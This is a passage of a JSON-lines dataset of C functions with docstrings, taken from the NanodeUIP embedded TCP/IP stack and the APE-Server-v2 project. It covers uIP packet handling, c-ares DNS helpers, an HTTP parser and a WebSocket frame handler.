8);\n    BUF->len[1] = ((uip_len - UIP_IPH_LEN) & 0xff);\n#else /* UIP_CONF_IPV6 */\n    BUF->len[0] = uip_len >> 8;\n    BUF->len[1] = uip_len & 0xff;\n#endif /* UIP_CONF_IPV6 */\n    \n    /*    uip_appdata += len1;*/\n    memcpy(uip_appdata, (u8_t *)uip_appdata + len1, len2);\n\n    uip_add32(BUF->seqno, len1);\n    BUF->seqno[0] = uip_acc32[0];\n    BUF->seqno[1] = uip_acc32[1];\n    BUF->seqno[2] = uip_acc32[2];\n    BUF->seqno[3] = uip_acc32[3];\n    \n    /* Recalculate the TCP checksum. */\n    BUF->tcpchksum = 0;\n    BUF->tcpchksum = ~(uip_tcpchksum());\n\n#if !UIP_CONF_IPV6\n    /* Recalculate the IP checksum. */\n    BUF->ipchksum = 0;\n    BUF->ipchksum = ~(uip_ipchksum());\n#endif /* UIP_CONF_IPV6 */\n\n    /* Transmit the second packet. */\n    /*    uip_fw_output();*/\n    tcpip_output();\n  } else {\n    /*    uip_fw_output();*/\n    tcpip_output();\n  }\n     \n}", "path": "uip\\uip-split.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nwebclient_appcall(void)", "code": "{\n  if(uip_connected()) {\n    s.timer = 0;\n    s.state = WEBCLIENT_STATE_STATUSLINE;\n    senddata();\n    webclient_connected();\n    return;\n  }\n\n  if(s.state == WEBCLIENT_STATE_CLOSE) {\n    webclient_closed();\n    uip_abort();\n    return;\n  }\n\n  if(uip_aborted()) {\n    webclient_aborted();\n  }\n  if(uip_timedout()) {\n    webclient_timedout();\n  }\n\n  \n  if(uip_acked()) {\n    s.timer = 0;\n    acked();\n  }\n  if(uip_newdata()) {\n    s.timer = 0;\n    newdata();\n  }\n  if(uip_rexmit() ||\n     uip_newdata() ||\n     uip_acked()) {\n    senddata();\n  } else if(uip_poll()) {\n    ++s.timer;\n    if(s.timer == WEBCLIENT_TIMEOUT) {\n      webclient_timedout();\n      uip_abort();\n      return;\n    }\n        /*    senddata();*/\n  }\n\n  if(uip_closed()) {\n    if(s.httpflag != HTTPFLAG_MOVED) {\n      /* Send NULL data to signal EOF. */\n      webclient_datahandler(NULL, 0);\n    } else {\n      if(resolv_lookup(s.host) == NULL) {\n\tresolv_query(s.host);\n      }\n      webclient_get(s.host, s.port, s.file);\n    }\n  }\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * Register a network interface with the forwarding module.\n *\n * \\param netif A pointer to the network interface that is to be\n * registered.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_fw_register(struct uip_fw_netif *netif)", "code": "{\n  netif->next = netifs;\n  netifs = netif;\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static u16_t\nparse_statusline(u16_t len)", "code": "{\n  char *cptr;\n  \n  while(len > 0 && s.httpheaderlineptr < sizeof(s.httpheaderline)) {\n    s.httpheaderline[s.httpheaderlineptr] = *(char *)uip_appdata;\n    ++((char *)uip_appdata);\n    --len;\n    if(s.httpheaderline[s.httpheaderlineptr] == ISO_nl) {\n\n      if((strncmp(s.httpheaderline, http_10,\n\t\t  sizeof(http_10) - 1) == 0) ||\n\t (strncmp(s.httpheaderline, http_11,\n\t\t  sizeof(http_11) - 1) == 0)) {\n\tcptr = &(s.httpheaderline[9]);\n\ts.httpflag = HTTPFLAG_NONE;\n\tif(strncmp(cptr, http_200, sizeof(http_200) - 1) == 0) {\n\t  /* 200 OK */\n\t  s.httpflag = HTTPFLAG_OK;\n\t} else if(strncmp(cptr, http_301, sizeof(http_301) - 1) == 0 ||\n\t\t  strncmp(cptr, http_302, sizeof(http_302) - 1) == 0) {\n\t  /* 301 Moved permanently or 302 Found. Location: header line\n\t     will contain thw new location. */\n\t  s.httpflag = HTTPFLAG_MOVED;\n\t} else {\n\t  s.httpheaderline[s.httpheaderlineptr - 1] = 0;\n\t}\n      } else {\n\tuip_abort();\n\twebclient_aborted();\n\treturn 0;\n      }\n      \n      /* We're done parsing the status line, so we reset the pointer\n\t and start parsing the HTTP headers.*/\n      s.httpheaderlineptr = 0;\n      s.state = WEBCLIENT_STATE_HEADERS;\n      break;\n    } else {\n      ++s.httpheaderlineptr;\n    }\n  }\n  return len;\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nacked(void)", "code": "{\n  u16_t len;\n  \n  if(s.getrequestleft > 0) {\n    len = s.getrequestleft > uip_mss()?\n      uip_mss():\n      s.getrequestleft;\n    s.getrequestleft -= len;\n    s.getrequestptr += len;\n  }\n}", "path": "uip\\apps\\webclient\\webclient.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*------------------------------------------------------------------------------*/\n/**\n * \\internal\n * Send out an ICMP TIME-EXCEEDED message.\n *\n * This function replaces the packet in the uip_buf buffer with the\n * ICMP packet.\n */\n/*------------------------------------------------------------------------------*/\n", "func_signal": "static void\ntime_exceeded(void)", "code": "{\n  u16_t tmp16;\n\n  /* We don't send out ICMP errors for ICMP messages. */\n  if(ICMPBUF->proto == UIP_PROTO_ICMP) {\n    uip_len = 0;\n    return;\n  }\n  /* Copy fields from packet header into payload of this ICMP packet. */\n  memcpy(&(ICMPBUF->payload[0]), ICMPBUF, 28);\n\n  /* Set the ICMP type and code. */\n  ICMPBUF->type = ICMP_TE;\n  ICMPBUF->icode = 0;\n\n  /* Calculate the ICMP checksum. */\n  ICMPBUF->icmpchksum = 0;\n  ICMPBUF->icmpchksum = ~uip_chksum((u16_t *)&(ICMPBUF->type), 36);\n\n  /* Set the IP destination address to be the source address of the\n     original packet. */\n  tmp16= BUF->destipaddr[0];\n  BUF->destipaddr[0] = BUF->srcipaddr[0];\n  BUF->srcipaddr[0] = tmp16;\n  tmp16 = BUF->destipaddr[1];\n  BUF->destipaddr[1] = BUF->srcipaddr[1];\n  BUF->srcipaddr[1] = tmp16;\n\n  /* Set our IP address as the source address. */\n  BUF->srcipaddr[0] = uip_hostaddr[0];\n  BUF->srcipaddr[1] = uip_hostaddr[1];\n\n  /* The size of the ICMP time exceeded packet is 36 + the size of the\n     IP header (20) = 56. */\n  uip_len = 56;\n  ICMPBUF->len[0] = 0;\n  ICMPBUF->len[1] = uip_len;\n\n  /* Fill in the other fields in the IP header. */\n  ICMPBUF->vhl = 0x45;\n  ICMPBUF->tos = 0;\n  ICMPBUF->ipoffset[0] = ICMPBUF->ipoffset[1] = 0;\n  ICMPBUF->ttl  = UIP_TTL;\n  ICMPBUF->proto = UIP_PROTO_ICMP;\n  \n  /* Calculate IP checksum. */\n  ICMPBUF->ipchksum = 0;\n  ICMPBUF->ipchksum = ~(uip_ipchksum());\n\n\n}", "path": "uip\\uip-fw.c", "repo_name": "sde1000/NanodeUIP", "stars": 38, "license": "None", "language": "c", "size": 1735}
{"docstring": "/*\n** ares_get_datatype() - c-ares internal helper function.\n**\n** This function returns the ares_datatype of the data stored in a\n** private ares_data struct when given the public API pointer.\n*/\n", "func_signal": "ares_datatype ares_get_datatype(void * dataptr)", "code": "{\n  struct ares_data *ptr;\n\n#ifdef __INTEL_COMPILER\n#  pragma warning(push)\n#  pragma warning(disable:1684)\n   /* 1684: conversion from pointer to same-sized integral type */\n#endif\n\n  ptr = (void *)((char *)dataptr - offsetof(struct ares_data, data));\n\n#ifdef __INTEL_COMPILER\n#  pragma warning(pop)\n#endif\n\n  if (ptr->mark == ARES_DATATYPE_MARK)\n    return ptr->type;\n\n  return ARES_DATATYPE_UNKNOWN;\n}", "path": "deps\\c-ares\\ares_data.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Save options from initialized channel */\n", "func_signal": "int ares_save_options(ares_channel channel, struct ares_options *options,\n                      int *optmask)", "code": "{\n  int i, j;\n  int ipv4_nservers = 0;\n\n  /* Zero everything out */\n  memset(options, 0, sizeof(struct ares_options));\n\n  if (!ARES_CONFIG_CHECK(channel))\n    return ARES_ENODATA;\n\n  /* Traditionally the optmask wasn't saved in the channel struct so it was\n     recreated here. ROTATE is the first option that has no struct field of\n     its own in the public config struct */\n  (*optmask) = (ARES_OPT_FLAGS|ARES_OPT_TRIES|ARES_OPT_NDOTS|\n                ARES_OPT_UDP_PORT|ARES_OPT_TCP_PORT|ARES_OPT_SOCK_STATE_CB|\n                ARES_OPT_SERVERS|ARES_OPT_DOMAINS|ARES_OPT_LOOKUPS|\n                ARES_OPT_SORTLIST|ARES_OPT_TIMEOUTMS) |\n    (channel->optmask & ARES_OPT_ROTATE);\n\n  /* Copy easy stuff */\n  options->flags   = channel->flags;\n\n  /* We return full millisecond resolution but that's only because we don't\n     set the ARES_OPT_TIMEOUT anymore, only the new ARES_OPT_TIMEOUTMS */\n  options->timeout = channel->timeout;\n  options->tries   = channel->tries;\n  options->ndots   = channel->ndots;\n  options->udp_port = (unsigned short)channel->udp_port;\n  options->tcp_port = (unsigned short)channel->tcp_port;\n  options->sock_state_cb     = channel->sock_state_cb;\n  options->sock_state_cb_data = channel->sock_state_cb_data;\n\n  /* Copy IPv4 servers */\n  if (channel->nservers) {\n    for (i = 0; i < channel->nservers; i++)\n    {\n      if (channel->servers[i].addr.family == AF_INET)\n        ipv4_nservers++;\n    }\n    if (ipv4_nservers) {\n      options->servers = malloc(ipv4_nservers * sizeof(struct server_state));\n      if (!options->servers)\n        return ARES_ENOMEM;\n      for (i = j = 0; i < channel->nservers; i++)\n      {\n        if (channel->servers[i].addr.family == AF_INET)\n          memcpy(&options->servers[j++],\n                 &channel->servers[i].addr.addrV4,\n                 sizeof(channel->servers[i].addr.addrV4));\n      }\n    }\n  }\n  options->nservers = ipv4_nservers;\n\n  /* copy domains */\n  if (channel->ndomains) {\n    options->domains = malloc(channel->ndomains * sizeof(char *));\n    if (!options->domains)\n      return ARES_ENOMEM;\n\n    for (i = 0; i < channel->ndomains; i++)\n    {\n      options->ndomains = i;\n      options->domains[i] = strdup(channel->domains[i]);\n      if (!options->domains[i])\n        return ARES_ENOMEM;\n    }\n  }\n  options->ndomains = channel->ndomains;\n\n  /* copy lookups */\n  if (channel->lookups) {\n    options->lookups = strdup(channel->lookups);\n    if (!options->lookups && channel->lookups)\n      return ARES_ENOMEM;\n  }\n\n  /* copy sortlist */\n  if (channel->nsort) {\n    options->sortlist = malloc(channel->nsort * sizeof(struct apattern));\n    if (!options->sortlist)\n      return ARES_ENOMEM;\n    for (i = 0; i < channel->nsort; i++)\n    {\n      memcpy(&(options->sortlist[i]), &(channel->sortlist[i]),\n             sizeof(struct apattern));\n    }\n  }\n  options->nsort = channel->nsort;\n\n  return ARES_SUCCESS;\n}", "path": "deps\\c-ares\\ares_init.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Initialize a list node */\n", "func_signal": "void ares__init_list_node(struct list_node* node, void* d)", "code": "{\n  node->prev = NULL;\n  node->next = NULL;\n  node->data = d;\n}", "path": "deps\\c-ares\\ares_llist.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Removes the node from the list it's in, if any */\n", "func_signal": "void ares__remove_from_list(struct list_node* node)", "code": "{\n  if (node->next != NULL) {\n    node->prev->next = node->next;\n    node->next->prev = node->prev;\n    node->prev = NULL;\n    node->next = NULL;\n  }\n}", "path": "deps\\c-ares\\ares_llist.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/*\n * Warning: returns a dynamically allocated buffer, the user MUST\n * use free() if the function returns 1\n */\n", "func_signal": "static int get_res_nt(HKEY hKey, const char *subkey, char **obuf)", "code": "{\n  /* Test for the size we need */\n  DWORD size = 0;\n  int result;\n\n  result = RegQueryValueEx(hKey, subkey, 0, NULL, NULL, &size);\n  if ((result != ERROR_SUCCESS && result != ERROR_MORE_DATA) || !size)\n    return 0;\n  *obuf = malloc(size+1);\n  if (!*obuf)\n    return 0;\n\n  if (RegQueryValueEx(hKey, subkey, 0, NULL,\n                      (LPBYTE)*obuf, &size) != ERROR_SUCCESS)\n  {\n    free(*obuf);\n    return 0;\n  }\n  if (size == 1)\n  {\n    free(*obuf);\n    return 0;\n  }\n  return 1;\n}", "path": "deps\\c-ares\\ares_init.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* TEST */\n", "func_signal": "int main()", "code": "{\n    int length = 0, i;\n    struct _http_parser p;\n\n    /* Process BYTE_GET/POST opti check before running the parser */\n\n    PARSER_RESET(&p);\n\n    p.ctx = &p;\n    p.callback = parse_callback;\n\n    char chaine[] = \"POST /foo/bar/beer HTTP/1.1\\nCONTENT-LENGTH: 320900\\r\\nfoo: bar\\n\";\n\n    /* TODO implement a \"duff device\" here */\n    for (i = 0, length = strlen(chaine); i < length; i++) {\n        if (parse_http_char(&p, chaine[i]) == 0) {\n            printf(\"fail\\n\");\n            break;\n        }\n    }\n}", "path": "src\\core\\ape_http_parser.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Swap the contents of two lists */\n", "func_signal": "void ares__swap_lists(struct list_node* head_a,\n                      struct list_node* head_b)", "code": "{\n  int is_a_empty = ares__is_list_empty(head_a);\n  int is_b_empty = ares__is_list_empty(head_b);\n  struct list_node old_a = *head_a;\n  struct list_node old_b = *head_b;\n\n  if (is_a_empty) {\n    ares__init_list_head(head_b);\n  } else {\n    *head_b = old_a;\n    old_a.next->prev = head_b;\n    old_a.prev->next = head_b;\n  }\n  if (is_b_empty) {\n    ares__init_list_head(head_a);\n  } else {\n    *head_a = old_b;\n    old_b.next->prev = head_a;\n    old_b.prev->next = head_a;\n  }\n}", "path": "deps\\c-ares\\ares_llist.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* compiled as jump table by gcc */\n", "func_signal": "inline int parse_http_char(struct _http_parser *parser, const unsigned char c)", "code": "{\n#define HTTP_FLG_POST (1 << 31)\n#define HTTP_FLG_QS (1 << 30)\n#define HTTP_FLG_BODYCONTENT (1 << 29)\n#define HTTP_FLG_READY (1 << 28)\n\n#define HTTP_ISQS() (parser->rx & HTTP_FLG_QS)\n#define HTTP_ISPOST() (parser->rx & HTTP_FLG_POST)\n#define HTTP_ISBODYCONTENT() (parser->rx & HTTP_FLG_BODYCONTENT)\n#define HTTP_ISREADY() (parser->rx & HTTP_FLG_READY)\n\n#define HTTP_PATHORQS (HTTP_ISQS() ? HTTP_QS_CHAR : HTTP_PATH_CHAR)\n\n#define HTTP_CONSUME_BODY() \\\n    if (--parser->cl == 0) { \\\n        parser->rx |= HTTP_FLG_READY; \\\n        parser->callback(parser->ctx, HTTP_READY, 0, parser->step); \\\n    }\n\n\n#define HTTP_BODY_AS_ENDED() (HTTP_ISBODYCONTENT() && --parser->cl == 0 && (parser->rx |= HTTP_FLG_READY, 1))\n\n\n    parser_class c_classe;\n    int8_t state;\n    unsigned char ch;\n\n    parser->step++;\n    \n    if (c >= 128) {\n        c_classe = C_ETC;\n    } else {\n        c_classe = ascii_class[c];\n    }    \n\n    if (c_classe == C_NUL || HTTP_ISREADY()) return 0;\n\n    state = state_transition_table[parser->state][c_classe]; /* state > 0, action < 0 */\n\n\n    if (state >= 0) {\n        parser->state = state;\n    } else {\n\n        switch(state) {\n            case MG: /* GET detected */\n                parser->callback(parser->ctx, HTTP_METHOD, HTTP_GET, parser->step);\n                parser->state = PT;\n                break;\n            case MP:\n                parser->callback(parser->ctx, HTTP_METHOD, HTTP_POST, parser->step);\n                parser->rx |= HTTP_FLG_POST;\n                parser->state = PT;\n                break;\n            case PE:\n                if (!HTTP_ISQS()) {\n                    parser->callback(parser->ctx, HTTP_PATH_END, 0, parser->step);\n                }\n                parser->state = H1;\n\n                break;\n            case HA: /* HTTP Major */\n                parser->callback(parser->ctx, HTTP_VERSION_MAJOR, c-'0', parser->step);\n                parser->state = H7;\n                break;\n            case HB: /* HTTP Minor */\n                parser->callback(parser->ctx, HTTP_VERSION_MINOR, c-'0', parser->step);\n                parser->state = EL;\n                break;\n            case KH: /* Header key */\n                parser->callback(parser->ctx, HTTP_HEADER_KEY, 0, parser->step);\n                parser->state = HI;\n                break;\n            case VH: /* Header value */\n                parser->callback(parser->ctx, HTTP_HEADER_VAL, 0, parser->step);\n                parser->state = (c_classe == C_CR ? ER : C1); /* \\r\\n or \\n */\n                break;\n            case KC: /* Content length */\n                parser->callback(parser->ctx, HTTP_HEADER_KEY, 0, parser->step);\n                parser->state = CV;\n                break;\n            case VC: /* Content length digit */\n                if ((parser->cl = (parser->cl*10) + (c - '0')) > MAX_CL) {\n                    return 0;\n                }\n                parser->state = CV;\n                break;\n            case VE:\n                parser->callback(parser->ctx, HTTP_CL_VAL, parser->cl, parser->step);\n                parser->state = (c_classe == C_CR ? ER : C1); /* \\r\\n or \\n */\n                break;\n\n            case EA: /* first char from %x */\n                if (HTTP_BODY_AS_ENDED()) {\n                    return 0;\n                }\n                ch = (unsigned char) (c | 0x20); /* tolower */\n\n                parser->rx |= (unsigned char)(10 + ch -\n                        ((ch >= '0' && ch <= '9') ? '0'+10 : 'a'))\n                            | (c << 8);\n\n                parser->state = E2;\n\n                break;\n            case EB: /* second char from %xx */\n                ch = (unsigned char) (c | 0x20); /* tolower */\n\n                ch = (unsigned char) (((parser->rx & 0x000000ff) << 4) + 10 + ch -\n                        ((ch >= '0' && ch <= '9') ? '0'+10 : 'a'));\n\n                parser->callback(parser->ctx, HTTP_ISBODYCONTENT() ?\n                                                HTTP_BODY_CHAR :\n                                                HTTP_PATHORQS,\n                                            ch, parser->step); /* return the decoded char */\n                parser->state = HTTP_ISBODYCONTENT() ? BT : PT;\n                parser->rx &= 0xF0000000;\n                if (HTTP_ISBODYCONTENT()) {\n                    HTTP_CONSUME_BODY();\n                }\n                break;\n            case EH:\n                parser->callback(parser->ctx, HTTP_HEADER_END, 0, parser->step);\n                if (HTTP_ISPOST()) {\n                    parser->state = BT;\n                    parser->rx = HTTP_FLG_POST | HTTP_FLG_QS | HTTP_FLG_BODYCONTENT;\n                    if (parser->cl) break; /* assume ready if 0/no content-length */\n                }\n                parser->rx |= HTTP_FLG_READY;\n                parser->callback(parser->ctx, HTTP_READY, 0, parser->step);\n                break;\n            case BC:\n                parser->callback(parser->ctx, HTTP_BODY_CHAR, c, parser->step);\n                HTTP_CONSUME_BODY();\n                break;\n            case PC:\n            case QS:\n\n                parser->state = PT;\n\n                if (state == QS && !HTTP_ISQS()) {\n                    parser->rx |= HTTP_FLG_QS;\n                    parser->callback(parser->ctx, HTTP_PATH_END, 0, parser->step);\n                    break;\n                }\n\n                parser->callback(parser->ctx, HTTP_PATHORQS, c, parser->step);\n\n                break;\n            case BH:\n                if (HTTP_BODY_AS_ENDED()) {\n                    return 0;\n                }\n                parser->state = E1;\n                break;\n            case HK:\n                parser->callback(parser->ctx, HTTP_HEADER_KEYC, c, parser->step);\n                parser->state = HH;\n                break;\n            case HV:\n                parser->callback(parser->ctx, HTTP_HEADER_VALC, c, parser->step);\n                parser->state = HI;\n                break;\n            default:\n                return 0;\n        }\n    }\n\n    return 1;\n}", "path": "src\\core\\ape_http_parser.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/*\n** ares_free_data() - c-ares external API function.\n**\n** This function must be used by the application to free data memory that\n** has been internally allocated by some c-ares function and for which a\n** pointer has already been returned to the calling application. The list\n** of c-ares functions returning pointers that must be free'ed using this\n** function is:\n**\n**   ares_get_servers()\n**   ares_parse_srv_reply()\n**   ares_parse_txt_reply()\n*/\n", "func_signal": "void ares_free_data(void *dataptr)", "code": "{\n  struct ares_data *ptr;\n\n  if (!dataptr)\n    return;\n\n#ifdef __INTEL_COMPILER\n#  pragma warning(push)\n#  pragma warning(disable:1684)\n   /* 1684: conversion from pointer to same-sized integral type */\n#endif\n\n  ptr = (void *)((char *)dataptr - offsetof(struct ares_data, data));\n\n#ifdef __INTEL_COMPILER\n#  pragma warning(pop)\n#endif\n\n  if (ptr->mark != ARES_DATATYPE_MARK)\n    return;\n\n  switch (ptr->type)\n    {\n      case ARES_DATATYPE_MX_REPLY:\n\n        if (ptr->data.mx_reply.next)\n          ares_free_data(ptr->data.mx_reply.next);\n        if (ptr->data.mx_reply.host)\n          free(ptr->data.mx_reply.host);\n        break;\n\n      case ARES_DATATYPE_SRV_REPLY:\n\n        if (ptr->data.srv_reply.next)\n          ares_free_data(ptr->data.srv_reply.next);\n        if (ptr->data.srv_reply.host)\n          free(ptr->data.srv_reply.host);\n        break;\n\n      case ARES_DATATYPE_TXT_REPLY:\n\n        if (ptr->data.txt_reply.next)\n          ares_free_data(ptr->data.txt_reply.next);\n        if (ptr->data.txt_reply.txt)\n          free(ptr->data.txt_reply.txt);\n        break;\n\n      case ARES_DATATYPE_ADDR_NODE:\n\n        if (ptr->data.addr_node.next)\n          ares_free_data(ptr->data.addr_node.next);\n        break;\n\n      default:\n        return;\n    }\n\n  free(ptr);\n}", "path": "deps\\c-ares\\ares_data.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* initialize an rc4 key. If possible a cryptographically secure random key\n   is generated using a suitable function (for example win32's RtlGenRandom as\n   described in\n   http://blogs.msdn.com/michael_howard/archive/2005/01/14/353379.aspx\n   otherwise the code defaults to cross-platform albeit less secure mechanism\n   using rand\n*/\n", "func_signal": "static void randomize_key(unsigned char* key,int key_data_len)", "code": "{\n  int randomized = 0;\n  int counter=0;\n#ifdef WIN32\n  BOOLEAN res;\n  if (ares_fpSystemFunction036)\n    {\n      res = (*ares_fpSystemFunction036) (key, key_data_len);\n      if (res)\n        randomized = 1;\n    }\n#else /* !WIN32 */\n#ifdef RANDOM_FILE\n  FILE *f = fopen(RANDOM_FILE, \"rb\");\n  if(f) {\n    counter = fread(key, 1, key_data_len, f);\n    fclose(f);\n  }\n#endif\n#endif /* WIN32 */\n\n  if ( !randomized ) {\n    for (;counter<key_data_len;counter++)\n      key[counter]=(unsigned char)(rand() % 256);\n  }\n}", "path": "deps\\c-ares\\ares_init.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/*\n** size_t to signed int\n*/\n", "func_signal": "int aresx_uztosi(size_t uznum)", "code": "{\n#ifdef __INTEL_COMPILER\n#  pragma warning(push)\n#  pragma warning(disable:810) /* conversion may lose significant bits */\n#endif\n\n  return (int)(uznum & (size_t) CARES_MASK_SINT);\n\n#ifdef __INTEL_COMPILER\n#  pragma warning(pop)\n#endif\n}", "path": "deps\\c-ares\\ares_nowarn.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* TODO: If a close has already been sent : doesnt process (check the RFC) */\n", "func_signal": "static void ape_server_on_ws_frame(ape_client *client, const unsigned char *data, ssize_t length, ape_global *ape)", "code": "{\n#ifdef _HAVE_MSGPACK    \n    if (client->serial_method == APE_CLIENT_SERIAL_MSGPACK) {\n        int success;\n        msgpack_unpacked msg;\n        \n        printf(\"We have %d data sized\\n\", length);\n        \n        msgpack_unpacked_init(&msg);\n        success = msgpack_unpack_next(&msg, data, length, NULL);\n        \n        msgpack_object obj = msg.data;\n        msgpack_object_print(stdout, obj);\n        printf(\"\\n\");    \n        \n    } else if (client->serial_method == APE_CLIENT_SERIAL_JSON) {\n\n#endif\n        /*\n        ape_ws_write(client->socket,\n            (unsigned char *)data, length,\n            APE_DATA_COPY);\n            \n            return;*/\n        int i;\n        \n        json_context jcx = {\n            .key_under   = 0,\n            .start_depth = 0,\n            .head        = NULL,\n            .current_cx  = NULL\n        };\n        \n        if (client->json.parser == NULL) {\n            JSON_config config;\n            init_JSON_config(&config);\n            config.depth                  = 15;\n            config.callback               = json_callback;\n            config.callback_ctx           = &jcx;\n            config.allow_comments         = 0;\n            config.handle_floats_manually = 0;\n\n            if ((client->json.parser = new_JSON_parser(&config)) == NULL) {\n                ape_ws_write(client->socket,\n                    (char *)CONST_STR_LEN(PATTERN_ERR_INTERNAL),\n                    APE_DATA_GLOBAL_STATIC);\n                return;\n            }\n        }\n        \n        for (i = 0; i < length; i++) {\n            if (!JSON_parser_char(client->json.parser, data[i])) {   \n                ape_ws_write(client->socket,\n                    (char *)CONST_STR_LEN(PATTERN_ERR_BAD_JSON),\n                    APE_DATA_GLOBAL_STATIC);\n                    \n                    return;\n                break;\n            }\n        }\n        if (!JSON_parser_done(client->json.parser)) {\n            ape_ws_write(client->socket,\n                (char *)CONST_STR_LEN(PATTERN_ERR_BAD_JSON),\n                APE_DATA_GLOBAL_STATIC);\n                \n                return;            \n        }\n        \n        ape_cmd_process_multi(jcx.head, client, ape);      \n#ifdef _HAVE_MSGPACK\n    }\n#endif\n\n\t//ape_ws_close(client->socket);\n\t\n\tAPE_EVENT(wsframe, client, data, length, ape);\n}", "path": "src\\core\\ape_server.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Return the length of the expansion of an encoded domain name, or\n * -1 if the encoding is invalid.\n */\n", "func_signal": "static int name_length(const unsigned char *encoded, const unsigned char *abuf,\n                       int alen)", "code": "{\n  int n = 0, offset, indir = 0;\n\n  /* Allow the caller to pass us abuf + alen and have us check for it. */\n  if (encoded == abuf + alen)\n    return -1;\n\n  while (*encoded)\n    {\n      if ((*encoded & INDIR_MASK) == INDIR_MASK)\n        {\n          /* Check the offset and go there. */\n          if (encoded + 1 >= abuf + alen)\n            return -1;\n          offset = (*encoded & ~INDIR_MASK) << 8 | *(encoded + 1);\n          if (offset >= alen)\n            return -1;\n          encoded = abuf + offset;\n\n          /* If we've seen more indirects than the message length,\n           * then there's a loop.\n           */\n          if (++indir > alen)\n            return -1;\n        }\n      else\n        {\n          offset = *encoded;\n          if (encoded + offset + 1 >= abuf + alen)\n            return -1;\n          encoded++;\n          while (offset--)\n            {\n              n += (*encoded == '.' || *encoded == '\\\\') ? 2 : 1;\n              encoded++;\n            }\n          n++;\n        }\n    }\n\n  /* If there were any labels at all, then the number of dots is one\n   * less than the number of labels, so subtract one.\n   */\n  return (n) ? n - 1 : n;\n}", "path": "deps\\c-ares\\ares_expand_name.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Inserts new_node before old_node */\n", "func_signal": "void ares__insert_in_list(struct list_node* new_node,\n                          struct list_node* old_node)", "code": "{\n  new_node->next = old_node;\n  new_node->prev = old_node->prev;\n  old_node->prev->next = new_node;\n  old_node->prev = new_node;\n}", "path": "deps\\c-ares\\ares_llist.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/*\n** ares_malloc_data() - c-ares internal helper function.\n**\n** This function allocates memory for a c-ares private ares_data struct\n** for the specified ares_datatype, initializes c-ares private fields\n** and zero initializes those which later might be used from the public\n** API. It returns an interior pointer which can be passed by c-ares\n** functions to the calling application, and that must be free'ed using\n** c-ares external API function ares_free_data().\n*/\n", "func_signal": "void *ares_malloc_data(ares_datatype type)", "code": "{\n  struct ares_data *ptr;\n\n  ptr = malloc(sizeof(struct ares_data));\n  if (!ptr)\n    return NULL;\n\n  switch (type)\n    {\n      case ARES_DATATYPE_MX_REPLY:\n        ptr->data.mx_reply.next = NULL;\n        ptr->data.mx_reply.host = NULL;\n        ptr->data.mx_reply.priority = 0;\n        break;\n\n      case ARES_DATATYPE_SRV_REPLY:\n        ptr->data.srv_reply.next = NULL;\n        ptr->data.srv_reply.host = NULL;\n        ptr->data.srv_reply.priority = 0;\n        ptr->data.srv_reply.weight = 0;\n        ptr->data.srv_reply.port = 0;\n        break;\n\n      case ARES_DATATYPE_TXT_REPLY:\n        ptr->data.txt_reply.next = NULL;\n        ptr->data.txt_reply.txt = NULL;\n        ptr->data.txt_reply.length  = 0;\n        break;\n\n      case ARES_DATATYPE_ADDR_NODE:\n        ptr->data.addr_node.next = NULL;\n        ptr->data.addr_node.family = 0;\n        memset(&ptr->data.addr_node.addrV6, 0,\n          sizeof(ptr->data.addr_node.addrV6));\n\n      default:\n        free(ptr);\n        return NULL;\n    }\n\n  ptr->mark = ARES_DATATYPE_MARK;\n  ptr->type = type;\n\n  return &ptr->data;\n}", "path": "deps\\c-ares\\ares_data.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
